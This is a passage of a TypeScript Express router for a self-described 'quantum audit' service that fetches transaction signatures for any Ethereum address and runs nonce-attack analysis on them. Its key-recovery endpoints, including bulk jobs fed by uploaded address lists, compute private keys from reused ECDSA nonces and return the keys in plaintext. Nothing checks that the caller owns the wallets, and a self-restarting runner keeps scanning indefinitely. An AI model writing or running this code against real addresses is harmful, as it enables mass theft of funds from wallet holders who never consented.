      if (!Array.isArray(addresses) || addresses.length === 0) {
        res.status(400).json({ error: "addresses[] is required" });
        return;
      }
      const batch = addresses.slice(0, 20).map(a => a.trim()).filter(Boolean);
      try {
        const results = await multiChainScanBatch(batch, { maxTx: 60 });
        res.json({ ok: true, count: results.length, results });
      } catch (e) {
        res.status(500).json({ error: String(e) });
      }
    }
  );

  // ── POST /api/quantum-audit/sig-engine/multi-chain/queue ───────────────────
  // Push addresses directly into the autonomous runner's multi-chain queue.
  // The runner will drain and scan them in the next window cycle.
  router.post(
    "/sig-engine/multi-chain/queue",
    requireAdminOrToken as never,
    (req: Request, res: Response) => {
      const { addresses } = req.body as { addresses?: string[] };
      if (!Array.isArray(addresses) || addresses.length === 0) {
        res.status(400).json({ error: "addresses[] is required" });
        return;
      }
      const pool = getCrossEnginePool();
      let queued = 0;
      for (const raw of addresses) {
        const addr = raw?.trim();
        if (!addr) continue;
        const chain = detectSigChain(addr);
        if (chain === "ethereum" || chain === "unknown") {
          pool.pendingE1TargetedAddresses.add(addr);
        } else {
          pool.pendingMultiChainAddresses.set(addr, chain);
        }
        queued++;
      }
      res.json({
        ok: true,
        queued,
        multiChainQueueSize: pool.pendingMultiChainAddresses.size,
      });
    }
  );

  // ── GET /api/quantum-audit/sig-engine/multi-chain/detect ───────────────────
  // Detect which blockchain an address belongs to.
  router.get(
    "/sig-engine/multi-chain/detect",
    requireAdminOrToken as never,
    (req: Request, res: Response) => {
      const address = String(req.query.address ?? "").trim();
      if (!address) {
        res.status(400).json({ error: "?address= is required" });
        return;
      }
      const chain = detectSigChain(address);
      res.json({ address, chain });
    }
  );

  // ── Boot: auto-start 30 s after server starts ──────────────────────────────
  setTimeout(() => {
    fs.mkdirSync(REPORTS_DIR, { recursive: true });
    mlog("Watchdog boot check…");
    const done = hasCompletedReport();
    if (done) {
      mlog(`Watchdog: completed report exists at ${done} — no restart needed`);
      setStatus(`DONE (existing report ${path.basename(done)})`);
    } else if (advAttackState.running) {
      mlog("Watchdog: scan already running — standby");
      setStatus("SCAN_RUNNING (pre-existing)");
    } else {
      mlog("Watchdog: no scan running, no completed report — auto-starting");
      startScan();
    }
  }, 30_000);

  // ── Heartbeat: every 5 min write progress to log ──────────────────────────
  setInterval(() => {
    const done = hasCompletedReport();
    if (done) {
      setStatus(`DONE (${path.basename(done)})`);
      return;
    }
    if (advAttackState.running) {
      const lastLog = advAttackState.log[advAttackState.log.length - 1] ?? "no progress yet";
      mlog(`Heartbeat — running=true | last: ${lastLog}`);
      setStatus(`SCAN_RUNNING | ${lastLog}`);
    } else {
      // Not running and no report — restart
      mlog("Heartbeat — scan not running, no completed report — restarting");
      setStatus("RESTARTING");
      startScan();
    }
  }, 5 * 60_000);

  // ── Autonomous Runner: self-healing endless loop ────────────────────────────
  // Starts 90 s after server boot. Resumes from saved state when available.
  // If the runner exits for any reason OTHER than an explicit user stop(),
  // it automatically restarts after a short cooldown — no human intervention needed.
  // To opt out permanently: set DISABLE_AUTONOMOUS_SCAN=true.

  const RUNNER_OPTS = {
    resumeFromSave:        true,
    windowSize:            50,
    pauseBetweenWindowsMs: 3_000,
    osintEveryNWindows:    10,
    peelEveryNWindows:     20,
    hybridEveryNWindows:   40,
    // no maxRuntimeMs → runs forever until stop() is called
  } as const;

  async function keepRunnerAlive(isFirstBoot: boolean): Promise<void> {
    if (process.env.DISABLE_AUTONOMOUS_SCAN === "true") {
      mlog("Autonomous runner: DISABLED by DISABLE_AUTONOMOUS_SCAN env var");
      return;
    }
    if (isAutonomousRunning()) {
      mlog("Autonomous runner: already running — skipping boot trigger");
      return;
    }

    mlog(`Autonomous runner: ${isFirstBoot ? "auto-starting" : "restarting"} (endless mode)…`);
    try {
      await startAutonomousRunner(RUNNER_OPTS);
    } catch (e) {
      mlog(`Autonomous runner crashed: ${String(e)}`);
    }

    // If the user explicitly stopped it via the API, honour that — don't restart.
    if (autonomousWasUserStopped()) {
      mlog("Autonomous runner: stopped by user — will NOT auto-restart. Use /autonomous/start to resume.");
      return;
    }

    // Any other exit (natural wrap, unexpected error) → restart after 30 s cooldown.
    mlog("Autonomous runner: exited — restarting in 30 s…");
    setTimeout(() => keepRunnerAlive(false), 30_000);
  }

  // First boot: 90-second warm-up grace period, then start the endless loop.
  setTimeout(() => keepRunnerAlive(true), 90_000);
}

// ── Key Recovery: in-memory batch job store ────────────────────────────────────

type KRWalletStatus = "pending" | "scanning" | "done" | "error" | "skipped";

interface KRWalletResult {
  address:           string;
  status:            KRWalletStatus;
  txsQueried:        number;
  txsFetched:        number;
  keyRecovered:      boolean;
  privateKey:        string | null;
  attackType:        string | null;
  findings:          Engine5Finding[];
  nonceReuseKeys:    string[];
  error?:            string;
  startedAt?:        string;
  completedAt?:      string;
}

interface KRJob {
  id:          string;
  status:      "running" | "paused" | "done" | "cancelled";
  total:       number;
  completed:   number;
  results:     KRWalletResult[];
  createdAt:   string;
  startedAt?:  string;
  finishedAt?: string;
  cancelled:   boolean;
}

const _krJobs = new Map<string, KRJob>();

function krJobId(): string {
  return Date.now().toString(36) + Math.random().toString(36).slice(2, 7);
}

async function runKRJob(job: KRJob, addresses: string[]): Promise<void> {
  const N = BigInt("0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141");
  function modInvN(a: bigint): bigint {
    let [old_r, rr] = [a, N], [old_s, ss] = [1n, 0n];
    while (rr !== 0n) { const q = old_r / rr; [old_r, rr] = [rr, old_r - q * rr]; [old_s, ss] = [ss, old_s - q * ss]; }
    return ((old_s % N) + N) % N;
  }

  job.startedAt = new Date().toISOString();
  job.status = "running";

  for (const address of addresses) {
    if (job.cancelled) { job.status = "cancelled"; break; }

    const walletResult: KRWalletResult = {
      address, status: "scanning", txsQueried: 0, txsFetched: 0,
      keyRecovered: false, privateKey: null, attackType: null,
      findings: [], nonceReuseKeys: [], startedAt: new Date().toISOString(),
    };
    job.results.push(walletResult);

    try {
      // Fetch tx list from Etherscan
      const url = `https://api.etherscan.io/api?module=account&action=txlist&address=${address.toLowerCase()}&sort=asc&page=1&offset=100`;
      let hashes: string[] = [];
      try {
        const ctrl = new AbortController();
        const t = setTimeout(() => ctrl.abort(), 12_000);
        const resp = await fetch(url, { signal: ctrl.signal });
        clearTimeout(t);
        if (resp.ok) {
          const json = await resp.json() as { status: string; result: Array<{ hash: string }> };
          if (json.status === "1" && Array.isArray(json.result)) {
            hashes = json.result.map((tx) => tx.hash).slice(0, 100);
          }
        }
      } catch { /* skip this wallet if unreachable */ }

      walletResult.txsQueried = hashes.length;

      if (hashes.length < 3) {
        walletResult.status = "skipped";
        walletResult.error = `Only ${hashes.length} transaction(s) on-chain — need ≥3 for Engine 5`;
        job.completed++;
        await new Promise((r) => setTimeout(r, 300));
        continue;
      }

      // Resolve tx signatures
      const records: TxSigRecord[] = [];
      for (let i = 0; i < hashes.length; i += 6) {
        if (job.cancelled) break;
        const batch = hashes.slice(i, i + 6);
        const settled = await Promise.allSettled(batch.map((h) => fetchTxSigMultiChain(h)));
        for (const s of settled) {
          if (s.status === "fulfilled" && s.value) records.push(s.value);
        }
      }

      walletResult.txsFetched = records.length;

      if (records.length < 3) {
        walletResult.status = "done";
        job.completed++;
        await new Promise((r) => setTimeout(r, 500));
        continue;
      }

      // Build TxSignatureData map and run Engine 5
      const sigsByAddress: Record<string, TxSignatureData[]> = {};
      for (const rec of records) {
        const addr = rec.address.toLowerCase();
        if (!sigsByAddress[addr]) sigsByAddress[addr] = [];
        sigsByAddress[addr].push({
          txHash: rec.txHash, blockNumber: rec.blockNumber, from: rec.address,
          to: null, value: "0", r: rec.r, s: rec.s, v: 0, z: rec.z,
          nonce: rec.nonce, gasPrice: "0",
        });
      }

      const e5Results = runEngine5(sigsByAddress);
      for (const r of e5Results) {
        if (r.address.toLowerCase() === address.toLowerCase()) {
          walletResult.findings.push(...r.findings);
        }
      }

      // Nonce reuse check
      const rIndex = new Map<string, TxSigRecord[]>();
      for (const rec of records) {
        const key = rec.r.toLowerCase();
        if (!rIndex.has(key)) rIndex.set(key, []);
        rIndex.get(key)!.push(rec);
      }
      for (const [r, recs] of rIndex) {
        if (recs.length < 2) continue;
        const [t1, t2] = recs;
        try {
          const rv = BigInt(r);
          const s1 = BigInt(t1.s), z1 = BigInt(t1.z);
          const s2 = BigInt(t2.s), z2 = BigInt(t2.z);
          const ds = ((s1 - s2) % N + N) % N;
          if (ds === 0n) continue;
          const k = ((z1 - z2) % N + N) % N * modInvN(ds) % N;
          const d = ((s1 * k - z1) % N + N) % N * modInvN(rv) % N;
          const { ethers: eth } = await import("ethers");
          const wallet = new eth.Wallet("0x" + d.toString(16).padStart(64, "0"));
          if (wallet.address.toLowerCase() === address.toLowerCase()) {
            walletResult.nonceReuseKeys.push("0x" + d.toString(16).padStart(64, "0"));
          }
        } catch { /* skip */ }
      }

      // Determine if key was recovered
      const criticalFinding = walletResult.findings.find((f) => f.keyVerified && f.privateKey);
      if (criticalFinding) {
        walletResult.keyRecovered = true;
        walletResult.privateKey = criticalFinding.privateKey;
        walletResult.attackType = criticalFinding.attackType;
      } else if (walletResult.nonceReuseKeys.length > 0) {
        walletResult.keyRecovered = true;
        walletResult.privateKey = walletResult.nonceReuseKeys[0];
        walletResult.attackType = "nonce_reuse";
      }

      walletResult.status = "done";
      walletResult.completedAt = new Date().toISOString();
    } catch (e) {
      walletResult.status = "error";
      walletResult.error = String(e);
    }

    job.completed++;
    // Polite delay between wallets (respect public RPC rate limits)
    await new Promise((r) => setTimeout(r, 1_200));
  }

  if (!job.cancelled) job.status = "done";
  job.finishedAt = new Date().toISOString();
}

// ── Key Recovery: fetch address tx history and run Engine 5 ──────────────────

router.post("/key-recovery/scan", async (req: Request, res: Response) => {
  const { address, txHashes } = req.body as { address?: string; txHashes?: string[] };

  if (!address || !/^0x[0-9a-fA-F]{40}$/.test(address)) {
    res.status(400).json({ error: "Invalid Ethereum address" });
    return;
  }

  const normalAddress = address.toLowerCase();

  // Step 1: Collect tx hashes — either user-supplied or fetched from Etherscan free API
  let hashes: string[] = [];

  if (txHashes && txHashes.length > 0) {
    hashes = txHashes.filter((h) => /^0x[0-9a-fA-F]{64}$/.test(h)).slice(0, 200);
  } else {
    // Etherscan free tier — no API key needed for basic queries
    try {
      const url = `https://api.etherscan.io/api?module=account&action=txlist&address=${normalAddress}&sort=asc&page=1&offset=100`;
      const controller = new AbortController();
      const timer = setTimeout(() => controller.abort(), 12_000);
      const resp = await fetch(url, { signal: controller.signal });
      clearTimeout(timer);
      if (resp.ok) {
        const json = await resp.json() as { status: string; result: Array<{ hash: string }> };
        if (json.status === "1" && Array.isArray(json.result)) {
          hashes = json.result.map((tx) => tx.hash).slice(0, 100);
        }
      }
    } catch {
      // Etherscan unavailable — respond with a helpful error
      res.status(502).json({
        error: "Could not fetch transaction history from Etherscan. Please supply tx hashes manually.",
        hint: "Paste the transaction hashes for this address in the txHashes field.",
      });
      return;
    }
  }

  if (hashes.length === 0) {
    res.status(404).json({ error: "No transactions found for this address.", txCount: 0 });
    return;
  }

  // Step 2: Resolve each hash across chains and extract ECDSA components
  const records: TxSigRecord[] = [];
  const CONCURRENCY = 6;

  for (let i = 0; i < hashes.length; i += CONCURRENCY) {
    const batch = hashes.slice(i, i + CONCURRENCY);
    const settled = await Promise.allSettled(batch.map((h) => fetchTxSigMultiChain(h)));
    for (const s of settled) {
      if (s.status === "fulfilled" && s.value) records.push(s.value);
    }
  }

  if (records.length === 0) {
    res.status(200).json({
      address: normalAddress,
      txsQueried: hashes.length,
      txsFetched: 0,
      findings: [],
      message: "Transactions found but could not extract signatures. The transactions may be on an unsupported chain or malformed.",
    });
    return;
  }

  // Step 3: Convert TxSigRecord → TxSignatureData (Engine 5 input format)
  const sigsByAddress: Record<string, TxSignatureData[]> = {};
  for (const rec of records) {
    const addr = rec.address.toLowerCase();
    if (!sigsByAddress[addr]) sigsByAddress[addr] = [];
    sigsByAddress[addr].push({
      txHash:      rec.txHash,
      blockNumber: rec.blockNumber,
      from:        rec.address,
      to:          null,
      value:       "0",
      r:           rec.r,
      s:           rec.s,
      v:           0,
      z:           rec.z,
      nonce:       rec.nonce,
      gasPrice:    "0",
    });
  }

  // Step 4: Run Engine 5 (sequential + geometric nonce attacks + bias checks)
  const e5Results = runEngine5(sigsByAddress);

  // Collect findings scoped to this address
  const findings: Engine5Finding[] = [];
  for (const r of e5Results) {
    if (r.address.toLowerCase() === normalAddress) {
      findings.push(...r.findings);
    }
  }

  // Also check for nonce reuse (r-value collisions) across the fetched sigs
  const rIndex = new Map<string, TxSigRecord[]>();
  for (const rec of records) {
    const key = rec.r.toLowerCase();
    if (!rIndex.has(key)) rIndex.set(key, []);
    rIndex.get(key)!.push(rec);
  }

  const nonceReuse: Array<{ r: string; txs: string[]; recoveredKey?: string }> = [];
  const N = BigInt("0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141");
  for (const [r, recs] of rIndex) {
    if (recs.length < 2) continue;
    const [t1, t2] = recs;
    try {
      const rv = BigInt(r);
      const s1 = BigInt(t1.s), z1 = BigInt(t1.z);
      const s2 = BigInt(t2.s), z2 = BigInt(t2.z);
      const ds = ((s1 - s2) % N + N) % N;
      if (ds === 0n) continue;
      function modInvN(a: bigint): bigint {
        let [old_r, rr] = [a, N], [old_s, ss] = [1n, 0n];
        while (rr !== 0n) { const q = old_r / rr; [old_r, rr] = [rr, old_r - q * rr]; [old_s, ss] = [ss, old_s - q * ss]; }
        return ((old_s % N) + N) % N;
      }
      const k = ((z1 - z2) % N + N) % N * modInvN(ds) % N;
      const d = ((s1 * k - z1) % N + N) % N * modInvN(rv) % N;
      const { ethers } = await import("ethers");
      const wallet = new ethers.Wallet("0x" + d.toString(16).padStart(64, "0"));
      if (wallet.address.toLowerCase() === normalAddress) {
        nonceReuse.push({ r, txs: [t1.txHash, t2.txHash], recoveredKey: "0x" + d.toString(16).padStart(64, "0") });
      } else {
        nonceReuse.push({ r, txs: [t1.txHash, t2.txHash] });
      }
    } catch { /* skip */ }
  }

  res.json({
    address: normalAddress,
    txsQueried: hashes.length,
    txsFetched: records.length,
    signaturesAnalyzed: records.filter((r) => r.address.toLowerCase() === normalAddress).length,
    findings,
    nonceReuse,
    summary: {
      keyRecovered: findings.some((f) => f.keyVerified) || nonceReuse.some((r) => r.recoveredKey),
      criticalCount: findings.filter((f) => f.severity === "critical").length,
      highCount:     findings.filter((f) => f.severity === "high").length,
      attackTypes:   [...new Set(findings.map((f) => f.attackType))],
    },
  });
});

// ── Key Recovery: batch job endpoints ────────────────────────────────────────

const krUpload = multer({
  storage: multer.memoryStorage(),
  limits: { fileSize: 10 * 1024 * 1024, files: 1 },
  fileFilter: (_req, file, cb) => {
    cb(null, /\.(txt|csv|json|md|log)$/i.test(file.originalname) || file.mimetype.startsWith("text/"));
  },
});

// POST /api/quantum-audit/key-recovery/batch — start batch job from address list
router.post("/key-recovery/batch", async (req: Request, res: Response) => {
  const { addresses } = req.body as { addresses?: string[] };
  if (!Array.isArray(addresses) || addresses.length === 0) {
    res.status(400).json({ error: "Provide addresses: string[]" });
    return;
  }
  const valid = addresses
    .map((a) => (typeof a === "string" ? a.trim().toLowerCase() : ""))
    .filter((a) => /^0x[0-9a-f]{40}$/.test(a));

  if (valid.length === 0) {
    res.status(400).json({ error: "No valid Ethereum addresses in the list." });
    return;
  }

  const job: KRJob = {
    id: krJobId(), status: "running", total: valid.length, completed: 0,
    results: [], createdAt: new Date().toISOString(), cancelled: false,
  };
  _krJobs.set(job.id, job);

  // Run in background
  runKRJob(job, valid).catch((e) => {
    job.status = "done";
    job.finishedAt = new Date().toISOString();
    logger.error({ jobId: job.id, err: String(e) }, "KR batch job crashed");
  });

  res.json({ jobId: job.id, total: valid.length, message: `Batch job started — ${valid.length} wallets queued.` });
});

// POST /api/quantum-audit/key-recovery/batch/upload — file upload → start batch job
router.post("/key-recovery/batch/upload", (req: Request, res: Response) => {
  krUpload.single("file")(req as any, res as any, async (err: unknown) => {
    if (err) { res.status(400).json({ error: String(err) }); return; }
    const file = (req as any).file as Express.Multer.File | undefined;
    if (!file) { res.status(400).json({ error: "No file uploaded (field name: 'file')" }); return; }

    try {
      const text = file.buffer.toString("utf8");
      // Extract all 0x-prefixed 40-char hex addresses from the file
      const found = Array.from(
        new Set(
          [...text.matchAll(/0x[0-9a-fA-F]{40}/gi)].map((m) => m[0].toLowerCase()),
        ),
      );

      if (found.length === 0) {
        res.status(400).json({ error: "No Ethereum addresses found in the file. Each address should start with 0x followed by 40 hex characters." });
        return;
      }

      const job: KRJob = {
        id: krJobId(), status: "running", total: found.length, completed: 0,
        results: [], createdAt: new Date().toISOString(), cancelled: false,
      };
      _krJobs.set(job.id, job);

      runKRJob(job, found).catch((e) => {
        job.status = "done";
        job.finishedAt = new Date().toISOString();
        logger.error({ jobId: job.id, err: String(e) }, "KR batch job crashed");
      });

      res.json({
        jobId:    job.id,
        total:    found.length,
        filename: file.originalname,
        preview:  found.slice(0, 10),
        message:  `Batch job started — ${found.length} wallet(s) queued from ${file.originalname}.`,
      });
    } catch (e) {
      res.status(500).json({ error: String(e) });
    }
  });
});

// GET /api/quantum-audit/key-recovery/batch/:jobId — poll status
router.get("/key-recovery/batch/:jobId", (req: Request, res: Response) => {
  const job = _krJobs.get(req.params.jobId);
  if (!job) { res.status(404).json({ error: "Job not found" }); return; }

  const recovered = job.results.filter((r) => r.keyRecovered);
  res.json({
    jobId:       job.id,
    status:      job.status,
    total:       job.total,
    completed:   job.completed,
    pending:     job.total - job.completed,
    recovered:   recovered.length,
    createdAt:   job.createdAt,
    startedAt:   job.startedAt,
    finishedAt:  job.finishedAt,
    results:     job.results,
    summary: {
      skipped:   job.results.filter((r) => r.status === "skipped").length,
      errored:   job.results.filter((r) => r.status === "error").length,
      done:      job.results.filter((r) => r.status === "done").length,
      keyCount:  recovered.length,
    },
  });
});

// DELETE /api/quantum-audit/key-recovery/batch/:jobId — cancel
router.delete("/key-recovery/batch/:jobId", (req: Request, res: Response) => {
  const job = _krJobs.get(req.params.jobId);
  if (!job) { res.status(404).json({ error: "Job not found" }); return; }
  job.cancelled = true;
  job.status = "cancelled";
  res.json({ jobId: job.id, status: "cancelled" });
});

// ── Key Recovery: status check for a quick preflight (HEAD → tx count only) ──

router.get("/key-recovery/preflight/:address", async (req: Request, res: Response) => {
  const { address } = req.params;
  if (!address || !/^0x[0-9a-fA-F]{40}$/i.test(address)) {
    res.status(400).json({ error: "Invalid address" });
    return;
  }
  try {
    const url = `https://api.etherscan.io/api?module=account&action=txlist&address=${address.toLowerCase()}&sort=asc&page=1&offset=1`;
    const controller = new AbortController();
    const timer = setTimeout(() => controller.abort(), 8_000);
    const resp = await fetch(url, { signal: controller.signal });
    clearTimeout(timer);
    if (resp.ok) {
      const countUrl = `https://api.etherscan.io/api?module=proxy&action=eth_getTransactionCount&address=${address.toLowerCase()}&tag=latest`;
      const cr = await fetch(countUrl, { signal: controller.signal });
      if (cr.ok) {
        const cj = await cr.json() as { result: string };
        const count = parseInt(cj.result ?? "0x0", 16);
        res.json({ address: address.toLowerCase(), txCount: count, etherscanReachable: true });
        return;
      }
    }
    res.json({ address: address.toLowerCase(), txCount: null, etherscanReachable: false });
  } catch {
    res.json({ address: address.toLowerCase(), txCount: null, etherscanReachable: false });
  }
});

export default router;
